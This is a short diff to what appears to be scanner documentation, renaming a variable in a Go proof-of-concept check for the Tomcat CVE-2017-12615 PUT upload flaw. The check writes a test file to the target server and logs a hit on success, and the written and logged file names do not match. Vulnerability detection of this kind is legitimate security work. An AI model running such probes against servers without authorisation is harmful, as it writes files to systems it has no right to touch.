@@ -10,10 +10,10 @@
 
 CVE_2017_12615 POC：
 ```
-func CVE_2017_12615(url string) bool {
-	if req, err := pkg.HttpRequset(url+"/vtset.txt", "PUT", "test", false, nil); err == nil {
+func CVE_2017_12615(szUrl string) bool {
+	if req, err := pkg.HttpRequset(szUrl+"/vtset.txt", "PUT", "test", false, nil); err == nil {
 		if req.StatusCode == 204 || req.StatusCode == 201 {
-			pkg.POClog(fmt.Sprintf("Found vuln Tomcat CVE_2017_12615|--\"%s/vtest.txt\"\n", url))
+			pkg.POClog(fmt.Sprintf("Found vuln Tomcat CVE_2017_12615|--\"%s/vtest.txt\"\n", szUrl))
 			return true
 		}
 	}
